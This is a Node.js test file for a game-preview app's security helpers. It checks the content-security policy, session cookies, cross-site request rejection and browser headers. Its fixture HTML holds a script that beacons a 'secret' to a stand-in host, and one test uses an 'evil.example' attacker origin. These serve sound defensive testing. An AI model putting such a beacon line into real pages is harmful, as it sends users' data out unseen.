import assert from "node:assert/strict";
import test from "node:test";
import { browserSecurityHeaders, isAuthorized, isSameOriginMutation, PREVIEW_CSP, securePreviewHtml, sessionValue } from "../scripts/security.mjs";

const page = '<!doctype html><html><head><title>Game</title></head><body><script>navigator.sendBeacon("//example.com", "secret")</script></body></html>';

test("preview HTML receives a deny-by-default CSP before generated content", () => {
  const secured = securePreviewHtml(page);
  assert.match(secured, /<head><meta http-equiv="Content-Security-Policy"/);
  assert.ok(secured.indexOf("Content-Security-Policy") < secured.indexOf("sendBeacon"));
  assert.match(PREVIEW_CSP, /connect-src 'none'/);
  assert.match(PREVIEW_CSP, /form-action 'none'/);
  assert.match(PREVIEW_CSP, /frame-src 'none'/);
});

test("pairing sessions require the server-derived HttpOnly cookie value", () => {
  const token = "adult-pairing-token";
  assert.equal(isAuthorized(`kiddo_session=${sessionValue(token)}`, token), true);
  assert.equal(isAuthorized("kiddo_session=guessed", token), false);
  assert.equal(isAuthorized("", token), false);
});

test("cross-site mutations are rejected", () => {
  assert.equal(isSameOriginMutation({ method: "POST", headers: { host: "pi.local:3000", origin: "http://pi.local:3000", "sec-fetch-site": "same-origin" } }), true);
  assert.equal(isSameOriginMutation({ method: "POST", headers: { host: "pi.local:3000", origin: "https://evil.example", "sec-fetch-site": "cross-site" } }), false);
});

test("main responses disable sensitive browser capabilities", () => {
  const headers = browserSecurityHeaders();
  assert.match(headers["content-security-policy"], /frame-ancestors 'none'/);
  assert.match(headers["permissions-policy"], /microphone=\(\)/);
  assert.equal(headers["referrer-policy"], "no-referrer");
});
